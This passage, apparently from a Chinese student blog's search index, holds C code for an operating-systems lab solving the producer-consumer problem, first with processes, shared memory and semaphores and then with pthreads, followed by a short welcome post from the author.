process space failed！\\n\");  \n        exit(1);  \n    }  \n\n\tif((sem_id = semget(IPC_PRIVATE,3,SEM_MODE)) < 0)\n\t{                  \t\t\t\t\t\t\t\t//创建三个信号量，SEM_EMPTY,SEM_FULL和MUTEX\n\t\tperror(\"create semaphore failed! \\n\");\n\t\texit(1);\n\t}\n\n\tif(semctl(sem_id,SEM_FULL,SETVAL,0) == -1)\n\t{\t\t\t\t\t\t\t\t\t\t\t\t//将索引为0的信号量设置为0-->SEM_FULL\n\t\tperror(\"sem set value error! \\n\");\t\t\n\t\texit(1);\n\t}\n \n\tif(semctl(sem_id,SEM_EMPTY,SETVAL,10) == -1)\n\t{\t\t\t\t\t\t\t\t\t\t\t\t//将索引为1的信号量设置为10-->SEM_EMPTY\n\t \tperror(\"sem set value error! \\n\");\n\t \texit(1);\n\t}\n\tif(semctl(sem_id,MUTEX,SETVAL,1) == -1)\n\t{\t\t\t\t\t\t\t\t\t\t\t\t//将索引为3的信号量设置为1-->MUTEX\n\t \tperror(\"sem set value error! \\n\");\n\t \texit(1);\n\t}\n\n\tshmptr -> head = 0;  \n    shmptr -> tail = 0;  \n    shmptr -> is_empty = 1;  \n    shmptr -> num = 0;\n\n\tfor(int i = 0; i < N_PRODUCER; i++)\n\t{\n\t\tparent = fork();\n\t\tif(parent < 0)\n\t\t{\n\t\t\tperror(\"the fork failed\");\n\t\t\texit(1);\n\t\t}\n\t\telse if(parent == 0)\n\t\t{\n\t\t\tshmptr = shmat(shm_id, 0, 0);   //将申请的共享内存附加到申请通信的进程空间\n\t\t\tif (shmptr == (void*)-1)\n\t\t\t{  \n        \t\tperror(\"add buffer to using process space failed！\\n\");  \n        \t\texit(1);  \n    \t\t}  \n\t\t\tint count = 0;\n\t\t\tfor(int j = 0; j < N_WORKTIME; j++)\n\t\t\t{\n\t\t\t\twaitSem(sem_id, SEM_EMPTY);\n\t\t\t\twaitSem(sem_id, MUTEX);\n\t\t\t\tsleep(get_random()); \n\n\t\t\t\tprintf(\"-------------------------------------------------------------\\n\");\n\t\t\t\tprintf(\"我是第 %d 个生产者进程，PID = %d\\n\", i + 1, getpid());\n\n\t\t\t\t/*生产产品*/\n\t\t\t\tchar c = getRandChar();                                      //随机获取字母\n\t\t\t\tshmptr -> str[shmptr->tail] = c;\n                shmptr -> tail = (shmptr->tail + 1) % MAX_BUFFER_SIZE;  \n                shmptr -> is_empty = 0;           //写入新产品  \n\t\t\t\tshmptr -> num++;\n\n\t\t\t\t/*打印输出结果*/\n\t\t\t\tprintTime();              //程序运行时间\n\n\t\t\t\tint p;\n\t\t\t\tprintf(\"缓冲区数据（%d个）：\",shmptr -> num);                   //打印缓冲区中的数据\n\t\t\t\tp = (shmptr->tail-1 >= shmptr->head) ? (shmptr->tail-1) : (shmptr->tail-1 + MAX_BUFFER_SIZE);  \n                for (p; !(shmptr -> is_empty) && p >= shmptr -> head; p--)  \n                {  \n                    printf(\"%c\", shmptr -> str[p % MAX_BUFFER_SIZE]);  \n                }  \n                printf(\"\\t 生产者 %d  放入 '%c'. \\n\", i + 1, c);  \n\t\t\t\tprintf(\"-------------------------------------------------------------\\n\");\n\n\t\t\t\tfflush(stdout);\n\t\t\t\tsigSem(sem_id, MUTEX);\n\t\t\t\tsigSem(sem_id, SEM_FULL);\n\t\t\t}\n\t\t\t//将共享段与进程之间解除连接  \n            shmdt(shmptr);  \n            exit(0); \n\t\t} \n\t}\n\n\tfor(int i = 0; i < N_CONSUMER; i++)\n\t{\n\t\tchild = fork();\n\t\tif(child < 0)//调用fork失败\n\t\t{\n\t\t\tperror(\"the fork failed\");\n\t\t\texit(1);\n\t\t}\n\t\telse if(child == 0)\n\t\t{\n\t\t\tint count = 0; \n\t\t\tshmptr = shmat(shm_id, 0, 0);   //将申请的共享内存附加到申请通信的进程空间\n\t\t\tif (shmptr == (void*)-1)\n\t\t\t{  \n        \t\tperror(\"add buffer to using process space failed！\\n\");  \n        \t\texit(1);  \n    \t\t} \n\t\t\tfor(int j = 0; j < N_WORKTIME; j++)\n\t\t\t{\n\n\t\t\t\twaitSem(sem_id, SEM_FULL);\n\t\t\t\twaitSem(sem_id, MUTEX);\n\t\t\t\tsleep(get_random()); \n\n\t\t\t\tprintf(\"-------------------------------------------------------------\\n\");\n\t\t\t\tprintf(\"我是第 %d 个消费者进程，PID = %d\\n\", i + 1, getpid());\n\t\t\t\t/*消费数据*/\n\t\t\t\tchar lt = shmptr -> str[shmptr -> head];  \n                shmptr -> head = (shmptr -> head + 1) % MAX_BUFFER_SIZE;  \n                shmptr -> is_empty = (shmptr->head == shmptr->tail);  //\n\t\t\t\tshmptr -> num--;\n\t\t\t\t/*打印输出结果*/\n\t\t\t\tprintTime(); //程序运行时间\n\n\t\t\t\tint p;\n\t\t\t\tprintf(\"缓冲区数据（%d个）：\",shmptr -> num);                   //打印缓冲区中的数据\n\t\t\t\tp = (shmptr -> tail - 1 >= shmptr -> head) ? (shmptr -> tail-1) : (shmptr -> tail - 1 + MAX_BUFFER_SIZE);  \n                for (p; !(shmptr -> is_empty) && p >= shmptr -> head; p--)  \n                {  \n                    printf(\"%c\", shmptr -> str[p % MAX_BUFFER_SIZE]);  \n                }  \n                printf(\"\\t 消费者 %d  取出 '%c'. \\n\", i + 1, lt);  \n\t\t\t\tprintf(\"-------------------------------------------------------------\\n\");\n\n\t\t\t\tfflush(stdout);\n\t\t\t\tsigSem(sem_id,MUTEX);\n\t\t\t\tsigSem(sem_id,SEM_EMPTY);\n\t\t\t}\n\t\t\t//将共享段与进程之间解除连接  \n        \tshmdt(shmptr);  \n        \texit(0);\n\t\t}  \n\t}\n\n\t    //主进程最后退出  \n    while (wait(0) != -1);  \n    //将共享段与进程之间解除连接  \n    shmdt(shmptr);  \n    //对共享内存区执行控制操作  \n    shmctl(shm_id,IPC_RMID,0);//当cmd为IPC_RMID时，删除该共享段  \n    shmctl(sem_id,IPC_RMID,0);  \n    printf(\"主进程运行结束！\\n\");  \n    fflush(stdout);  \n    exit(0); \n\treturn 0;\n}\n\n```\n\n### 七、利用多线程实现本实验\n\n```c++\n#include <pthread.h>\n#include <stdio.h>\n#include <semaphore.h>\n#include <time.h>\n#include <stdlib.h>\n/*信号量*/\n//空的信号量和满的信号量\nsem_t empty_sem, full_sem;   \n//静态创建条件变量\npthread_cond_t full = PTHREAD_COND_INITIALIZER;        //满的变量\npthread_cond_t empty = PTHREAD_COND_INITIALIZER;       //空的变量\npthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;      //互斥锁\n\n#define BUFFERNUM 10    \n\n//缓冲区队列\nstruct Buffer_Queue {\n\tchar production[BUFFERNUM];  //产品\n\tint front, rear;             //头指针和尾指针\n\tint num;                     //缓冲区里面字母数量        \n};\n\n//输出设计者信息\nvoid printDesign()\n{\n\tprintf(\"   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\\n\");\n\tprintf(\"   ┃            生产者-消费者问题实现                 ┃\\n\");\n\tprintf(\"   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\\n\");\n}\n\n//随机产生生产字符\nchar getRandChar()\n{\n\tint temp = rand()%26;\n\treturn ('a'+temp);\n}\n\n//打印进程运行结果\nvoid printTime()\n{\n\t//打印时间\n\ttime_t now;\n\tstruct tm *timenow;         //实例化tm结构指针\n\ttime(&now);\n\ttimenow = localtime(&now);\n\tprintf(\"执行时间： %s \",asctime(timenow));\n}\n\n//生产者1\nvoid *producer1(void *arg)\n{\n\tstruct Buffer_Queue *q;\n\tq = (struct Buffer_Queue *) arg;\n\twhile(1)\n\t{\n\t\tpthread_mutex_lock(&lock);       \n\t\twhile (q->num == BUFFERNUM)    //缓冲区已经满了，等待\n\t\t{            \n\t\t\tpthread_cond_wait(&full, &lock);\n\t\t}\n\t\tsem_wait(&empty_sem);\n\n\t\t/*生产产品*/\n\t\tchar c = getRandChar();                                      //随机获取字母\n\t\tq->rear = (q->rear + 1) % BUFFERNUM;                         //计算新的尾指针   \n\t\tq->production[q->rear] = c;                                  //写入新产品\n\t\tq->num++;\n\t\t\n\t\t/*打印输出结果*/\n\t\tprintf(\"-------------------------------------------------------------\\n\");\n\t\tprintTime();              //程序运行时间\n\t\tint i;\n\t\tprintf(\"缓冲区数据（%d个）：\",q->num);                  //打印缓冲区中的数据\n\t\tif(q->front < q->rear)\n\t\t{\n\t\t\tfor(i = q->front; i <= q->rear; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor(i = q->front; i < BUFFERNUM; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t\tfor(i = 0; i <= q->rear; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t}\n\t\tprintf(\"\\n当前执行的进程：生产者1\\n\");   //打印当前执行的进程\n\t\tprintf(\"产生的数据：%c\\n\",c);      //打印产生或消费的数据\n\t\tprintf(\"-------------------------------------------------------------\\n\");\n\n\t\tsem_post(&full_sem);\n\n\t\tif (q->num == 1) {\n\t\t\tpthread_cond_signal(&empty);    \n\t\t}\n\t\tpthread_mutex_unlock(&lock); \n\n\t\tsleep(rand() % 2);            \n\t}\n}\n\n//生产者2\nvoid *producer2(void *arg)\n{\n\tstruct Buffer_Queue *q;\n\tq = (struct Buffer_Queue *) arg;\n\twhile(1)\n\t{\n\t\tpthread_mutex_lock(&lock);       \n\t\twhile (q->num == BUFFERNUM)    //缓冲区已经满了，等待\n\t\t{            \n\t\t\tpthread_cond_wait(&full, &lock);\n\t\t}\n\t\tsem_wait(&empty_sem);\n\n\t\t/*生产产品*/\n\t\tchar c = getRandChar();                                      //随机获取字母\n\t\tq->rear = (q->rear + 1) % BUFFERNUM;                         //计算新的尾指针   \n\t\tq->production[q->rear] = c;                                  //写入新产品  \n\t\tq->num++;\n\n\t\t/*打印输出结果*/\n\t\tprintf(\"-------------------------------------------------------------\\n\");\n\t\tprintTime();              //程序运行时间\n\t\tint i;\n\t\tprintf(\"缓冲区数据（%d个）：\",q->num);                   //打印缓冲区中的数据\n\t\tif(q->front < q->rear)\n\t\t{\n\t\t\tfor(i = q->front; i <= q->rear; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor(i = q->front; i < BUFFERNUM; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t\tfor(i = 0; i <= q->rear; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t}\n\t\tprintf(\"\\n当前执行的进程：生产者2\\n\");   //打印当前执行的进程\n\t\tprintf(\"产生的数据：%c\\n\",c);      //打印产生或消费的数据\n\t\tprintf(\"-------------------------------------------------------------\\n\");\n\n\t\tsem_post(&full_sem);\n\n\t\tif (q->num == 1) {\n\t\t\tpthread_cond_signal(&empty);    \n\t\t}\n\t\tpthread_mutex_unlock(&lock); \n\n\t\tsleep(rand() % 2);            \n\t}\n}\n\n//消费者1\nvoid *consumer1(void *arg)\n{\n\tstruct Buffer_Queue *q;\n\tq = (struct Buffer_Queue *) arg;\n\twhile(1)\n\t{\n\t\tpthread_mutex_lock(&lock);        \n\t\twhile (q->num == 0)           //缓冲区已经空了，等待\n\t\t{        \n\t\t\tpthread_cond_wait(&empty, &lock);\n\t\t}\n\t\tsem_wait(&full_sem);\n\n\t\t/*消费产品*/\n\t\tq->front = (q->front + 1) % BUFFERNUM;    //计算新的头指针\n\t\tchar c = q->production[q->front];         //消费产品\n\t\tq->production[q->front] = ' ';            //\n\t\tq->num--;\n\n\t\t/*打印输出结果*/\n\t\tprintf(\"-------------------------------------------------------------\\n\");\n\t\tprintTime();              //程序运行时间\n\t\tint i;\n\t\tprintf(\"缓冲区数据（%d个）：\",q->num);                   //打印缓冲区中的数据\n\t\tif(q->front < q->rear)\n\t\t{\n\t\t\tfor(i = q->front; i <= q->rear; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor(i = q->front; i < BUFFERNUM; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t\tfor(i = 0; i <= q->rear; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t}\n\t\tprintf(\"\\n当前执行的进程：消费者1\\n\");   //打印当前执行的进程\n\t\tprintf(\"消耗的数据：%c\\n\",c);      //打印产生或消费的数据\n\t\tprintf(\"-------------------------------------------------------------\\n\");\n\n\n\t\tsem_post(&empty_sem);\n\t\tif (q->num == BUFFERNUM - 1) {\n\t\t\tpthread_cond_signal(&full);\n\t\t}\n\t\tpthread_mutex_unlock(&lock);\n\t\tsleep(rand() % 2);\n\t}\n}\n\n//消费者2\nvoid *consumer2(void *arg)\n{\n\tstruct Buffer_Queue *q;\n\tq = (struct Buffer_Queue *) arg;\n\twhile(1)\n\t{\n\t\tpthread_mutex_lock(&lock);        \n\t\twhile (q->num == 0)           //缓冲区已经空了，等待\n\t\t{        \n\t\t\tpthread_cond_wait(&empty, &lock);\n\t\t}\n\t\tsem_wait(&full_sem);\n\n\t\t/*消费产品*/\n\t\tq->front = (q->front + 1) % BUFFERNUM;    //计算新的头指针\n\t\tchar c = q->production[q->front];         //消费产品\n\t\tq->production[q->front] = ' ';            //\n\t\tq->num--;\n\n\t\t/*打印输出结果*/\n\t\tprintf(\"-------------------------------------------------------------\\n\");\n\t\tprintTime();              //程序运行时间\n\t\tint i;\n\t\tprintf(\"缓冲区数据（%d个）：\",q->num);                   //打印缓冲区中的数据\n\t\tif(q->front < q->rear)\n\t\t{\n\t\t\tfor(i = q->front; i <= q->rear; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor(i = q->front; i < BUFFERNUM; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t\tfor(i = 0; i <= q->rear; i++)\n\t\t\t\tprintf(\"%c \",q->production[i]);\n\t\t}\n\t\tprintf(\"\\n当前执行的进程：消费者1\\n\");   //打印当前执行的进程\n\t\tprintf(\"消耗的数据：%c\\n\",c);      //打印产生或消费的数据\n\t\tprintf(\"-------------------------------------------------------------\\n\");\n\n\n\t\tsem_post(&empty_sem);\n\t\tif (q->num == BUFFERNUM - 1) {\n\t\t\tpthread_cond_signal(&full);\n\t\t}\n\t\tpthread_mutex_unlock(&lock);\n\t\tsleep(rand() % 2);\n\t}\n}\n\nint main(int argc, char *argv[])\n{\n    //输出设计者\n\tprintDesign();\n\n\t/*创建缓冲区*/\n\t//定义\n\tstruct Buffer_Queue *q;\n\tq = (struct Buffer_Queue *) malloc(sizeof(struct Buffer_Queue));\n\t//初始化队列\n\tq->front = q->rear = BUFFERNUM - 1;\n\tq->num = 0;\n\n\t/*执行进程*/\n\t//定义四个线程\n\tpthread_t pid1, cid1, pid2, cid2;\n\t//初始化信号量\n\tsem_init(&empty_sem, 0, BUFFERNUM);   \n\tsem_init(&full_sem, 0, 0);   \n\t//创建线程\n\tpthread_create(&pid1, NULL, producer1, (void *) q);\n\tpthread_create(&cid1, NULL, consumer1, (void *) q);\n\tpthread_create(&pid2, NULL, producer2, (void *) q);\n\tpthread_create(&cid2, NULL, consumer2, (void *) q);\n\t//销毁线程\n\tpthread_join(pid1, NULL);\n\tpthread_join(cid1, NULL);\n\tpthread_join(pid2, NULL);\n\tpthread_join(cid2, NULL);\n\t//销毁信号量\n\tsem_destroy(&empty_sem);\n\tsem_destroy(&full_sem);\n\n\treturn 0;\n}\n\n```\n\n"},{"title":"Welcome to my website","url":"/2018/01/19/hello-world/","content":"欢迎来到Abigale的博客。\n\n<!--more-->\n\n一名来自山东的计算机科班学生，专业信息安全\n\n科班来自湖南大学\n\n记录生活，学习技术\n\nAbigale：最初的快乐\n\n我爱我的父母，爱我的家人，爱我的学校，爱我的家乡\n\n我爱中国！\n\n"}]